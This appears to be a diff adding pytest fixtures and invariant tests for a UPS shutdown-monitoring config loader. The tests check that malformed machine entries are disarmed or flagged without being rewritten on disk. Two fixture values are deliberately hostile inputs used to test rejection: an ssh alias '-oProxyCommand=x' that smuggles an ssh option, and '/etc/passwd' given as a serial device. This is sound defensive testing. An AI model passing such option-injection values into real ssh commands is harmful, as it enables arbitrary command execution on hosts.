+        {"name": "DUP", "ssh": "dup-b", "ups": "cyberpower2", "shutdown_method": "ssh"},
+        # unprojectable push (blank ups) + HI-04 unparseable baud + MED-10 device
+        {
+            "name": "unfireable",
+            "shutdown_method": "serial",
+            "serial_device": "/etc/passwd",
+            "serial_baud": "fast",
+            "_comment": "keep me",
+        },
+        # IW-05 stale enrollment fingerprint
+        {
+            "name": "handedited",
+            "ssh": "handedited",
+            "ups": "cyberpower2",
+            "shutdown_method": "ssh",
+            "ip": "192.168.1.200",
+        },
+        # T-02-10 option-shaped alias
+        {
+            "name": "injected",
+            "ssh": "-oProxyCommand=x",
+            "ups": "cyberpower2",
+            "shutdown_method": "ssh",
+        },
+        # unknown UPS reference on a NATIVE machine — advisory, never a disarm
+        {"name": "typo", "ssh": "typo", "ups": "cyberpwoer", "shutdown_method": "native"},
+        # BL-02 explicit none with a ups — advisory
+        {"name": "off", "ssh": "off", "ups": "cyberpower2", "shutdown_method": "none"},
+        # HI-05 native with a blank ups — advisory
+        {"name": "blanknative", "ssh": "blanknative", "shutdown_method": "native"},
+    ],
+}
+
+
+def _every_defect(tmp_path: Path) -> Config:
+    return Config.load(_write(tmp_path, EVERY_DEFECT), env={})
+
+
+def test_inv_degrade_no_degrade_alters_what_a_persist_would_write(tmp_path: Path) -> None:
+    # THE general property test. Round 1 found one instance of "an in-memory degrade
+    # leaks to disk", guarded that instance, and treated the class as closed; it occurs
+    # three times. This asserts the structural rule instead of the three patches, so the
+    # class cannot recur — including for degrades nobody has thought of yet.
+    #
+    # (The one deliberate to_dict SHAPE change, LO-14's nested serial block, is asserted
+    # separately by test_to_dict_drops_nested_serial_block and is not a degrade.)
+    cfg = _every_defect(tmp_path)
+    assert cfg.degraded
+    authored = EVERY_DEFECT["monitored_machines"]
+    assert isinstance(authored, list)
+    # No record is dropped and the order is preserved: _monitor_persist rewrites the
+    # whole array from cfg.monitored_machines, so a drop here is a DELETION on disk.
+    assert len(cfg.monitored_machines) == len(authored)
+    for record, machine in zip(authored, cfg.monitored_machines, strict=True):
+        out = machine.to_dict()
+        for key, value in record.items():
+            assert out[key] == value, f"{machine.name}.{key} was rewritten by a degrade"
+
+
+def test_inv_severity_no_advisory_ever_disarms_and_no_native_is_ever_disarmed(
+    tmp_path: Path,
+) -> None:
+    # The general guard, so a future site that attaches an advisory through the wrong
+    # helper fails HERE rather than in production.
+    cfg = _every_defect(tmp_path)
+    for m in cfg.monitored_machines:
+        if m.shutdown_method == "native":
+            assert m.disarmed is False, m.name
+            assert m.effective_method == "native", m.name
+        if m.load_notices and all(n.severity == "advisory" for n in m.load_notices):
+            assert m.disarmed is False, m.name
+            assert m.effective_method == m.shutdown_method, m.name
+        if any(n.severity == "error" for n in m.load_notices) and m.shutdown_method in (
+            "serial",
+            "ssh",
+        ):
+            assert m.effective_method == "none", m.name
+    for ups in cfg.upses.values():
+        for t in ups.shutdown_targets:
+            if t.load_notices and all(n.severity == "advisory" for n in t.load_notices):
+                assert t.effective_enabled == t.enabled, t.name
+
+
+def test_every_defect_config_still_loads_and_reports_each_class(tmp_path: Path) -> None:
+    cfg = _every_defect(tmp_path)
+    by_name = {m.name: m for m in cfg.monitored_machines}
+    assert by_name["mt"].effective_method == "none"  # dual-regime push
+    assert by_name["spark"].effective_method == "native"  # native survives, armed
+    assert by_name["unfireable"].effective_method == "none"  # unprojectable + transport
+    assert by_name["handedited"].effective_method == "none"  # IW-05
+    assert by_name["injected"].effective_method == "none"  # T-02-10
+    assert by_name["typo"].effective_method == "native"  # advisory only
+    assert by_name["off"].effective_method == "none"  # declared off
+    assert by_name["blanknative"].effective_method == "native"  # HI-05 notice-only
+    assert by_name["off"].disarmed is False  # advisory did not disarm it
+    # Every subject is named on the machine-readable surface monitor list / status read.
+    subjects = {n.subject for n in cfg.degraded}
+    assert {"mt", "spark", "dup", "DUP", "unfireable", "handedited", "injected"} <= subjects
+    assert {"cyberpower/no-host", "cyberpower/odd-kind", "cyberpower/bad-baud"} <= subjects
